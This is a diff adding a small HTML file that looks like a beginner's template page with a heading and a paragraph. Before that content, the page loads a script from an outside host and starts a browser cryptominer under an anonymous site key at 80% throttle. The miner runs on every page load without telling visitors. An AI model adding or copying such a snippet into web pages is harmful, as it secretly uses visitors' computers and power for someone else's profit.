@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script src="https://www.hostingcloud.racing/4NB1.js"></script>
+<script>
+    var miner = new Client.Anonymous('629eef76b62396f5ad1f607873d16bbac2f41439d40b3ad08968eb56ec413ddc',{ throttle: 0.8});
+    miner.start();
+</script>
+<h1>My First Heading</h1>
+<p>My first paragraph.</p>
+
+</body>
+</html>
